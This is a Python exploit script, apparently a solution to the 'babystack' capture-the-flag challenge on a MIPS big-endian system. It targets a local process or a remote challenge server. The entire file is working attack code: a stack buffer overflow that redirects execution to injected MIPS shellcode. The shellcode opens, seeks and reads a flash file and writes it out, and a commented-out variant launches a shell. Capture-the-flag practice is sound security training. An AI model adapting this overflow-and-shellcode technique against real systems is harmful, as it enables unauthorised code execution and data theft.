#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './initrd/bin/babystack'
context(arch = 'mips', endian = 'big')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'PROC', remote = 'SOCKET')
env.set_item('target',  local   = {'argv':['./run.sh']}, \
                        remote  = {'host':'chall.0ops.sjtu.edu.cn', 'port':9999})
env.select()

#==========

binf = ELF(bin_file)
addr_bss            = binf.sep_section['.bss']

addr_stack          = 0x700ffdb0
ofs_data            = 0x20
ofs_shellcode       = 0x80

sys_exit            = 0x05 # exit(status)
sys_open            = 0x0b # opwn(path, flags, mode)
sys_read            = 0x0d # read(fd, buf, len)
sys_write           = 0x0e # write(fd, buf, len)
sys_lseek           = 0x14 # lseek(fd, offset, whence)
sys_execv           = 0x1a # execv(path, argc, argv)

#==========

def attack(conn, **kwargs):
    sysno = {'exit' : sys_exit, 'open' : sys_open, 'read' : sys_read, 'write' : sys_write, 'lseek' : sys_lseek, 'execv' : sys_execv}

    #shellasm = '''
    #li $a0, {execv}
    #addiu $a1, $sp, 0x18
    #syscall
    #nop
    #'''.format(**sysno)

    shellasm = '''
    li $a0, {open}
    addiu $a1, $sp, 0x18
    syscall
    nop

    li $a0, {lseek}
    addiu $a1, $sp, 0x18+0xc
    syscall
    nop

    li $a0, {read}-1
    addiu $a0, 1
    addiu $a1, $sp, 0x18+0xc*2
    syscall
    nop

    li $a0, {write}
    addiu $a1, $sp, 0x18+0xc*3
    syscall
    nop

    li $a0, {exit}
    syscall
    nop

    '''.format(**sysno)

    exploit  = b'\x00'*0x14
    exploit += p32(addr_stack + ofs_shellcode)

    '''
    exploit  = exploit.ljust(ofs_data, b'\x00')
    exploit += b'/bin/shell\x00'.ljust(0x10, b'\x00')
    exploit += p32(addr_stack + ofs_data)
    exploit += p32(0)
    '''
    exploit  = exploit.ljust(ofs_data, b'\x00')
    # open
    exploit += b'/pflash/yamon\x00'.ljust(0x10, b'\x00')
    exploit += p32(addr_stack + ofs_data)   # path
    exploit += p32(0)                       # flags
    exploit += p32(0)                       # mode

    # lseek
    exploit += p32(3)                       # fd
    exploit += p32(0xfff00)                 # offset
    exploit += p32(0)                       # whence

    # read
    exploit += p32(3)                       # fd
    exploit += p32(addr_bss + 0x80)         # buf
    exploit += p32(0x40)                    # len

    # write
    exploit += p32(1)                       # fd
    exploit += p32(addr_bss + 0x80)         # buf
    exploit += p32(0x40)                    # len

    exploit  = exploit.ljust(ofs_shellcode, b'\x00')
    exploit += asm(shellasm)

    conn.sendafter('Idle thread is running!', exploit.ljust(0x200, b'\x00'))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag{which vulnerability did you use to expolit}

if __name__=='__main__':
    main()

#==========
